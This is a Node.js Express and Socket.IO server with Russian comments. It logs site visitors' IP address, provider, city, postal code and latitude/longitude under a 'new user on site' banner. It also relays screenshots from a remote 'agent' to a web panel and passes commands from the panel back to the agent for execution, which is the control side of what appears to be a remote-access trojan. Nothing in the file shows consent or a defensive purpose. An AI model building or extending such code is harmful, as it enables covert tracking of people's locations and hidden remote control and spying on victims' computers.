const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Указываем, что статические файлы (веб-интерфейс) находятся в папке 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Обработка подключения клиентов
io.on('connection', (socket) => {
    console.log('Новый клиент подключился:', socket.id);

    // --- Обработчик для получения данных о пользователе ---
    socket.on('user-data-to-server', (userData) => {
        // Выводим всю информацию в терминал сервера
        console.log('\n=================================================');
        console.log('!!! НОВЫЙ ПОЛЬЗОВАТЕЛЬ НА САЙТЕ !!!');
        console.log('=================================================');
        console.log(`IP-адрес:        ${userData.ip}`);
        console.log(`Тип устройства:  ${userData.is_mobile ? 'Мобильное' : 'ПК/Ноутбук'}`);
        console.log(`Провайдер:       ${userData.org}`);
        console.log(`Страна:          ${userData.country_name} (${userData.country})`);
        console.log(`Регион:          ${userData.region}`);
        console.log(`Город:           ${userData.city}`);
        console.log(`Почтовый индекс: ${userData.postal}`);
        console.log(`Широта:          ${userData.latitude}`);
        console.log(`Долгота:         ${userData.longitude}`);
        console.log('=================================================\n');
    });

    socket.on('disconnect', () => {
        console.log('Клиент отключился:', socket.id);
    });

    // Получаем скриншот от агента и пересылаем его в веб-интерфейс
    socket.on('screen-data', (data) => {
        socket.broadcast.emit('screen-update', data);
    });

    // Получаем команду из веб-интерфейса и пересылаем агенту
    socket.on('command', (cmd) => {
        socket.broadcast.emit('execute-command', cmd);
    });
});

// Запускаем сервер на порту 3000
server.listen(3000, '0.0.0.0', () => {
    console.log('Сервер запущен!');
    console.log('Локальный доступ: http://jopasuslika:3000');
    console.log('Доступ в сети: http://jopasuslika:3000');
});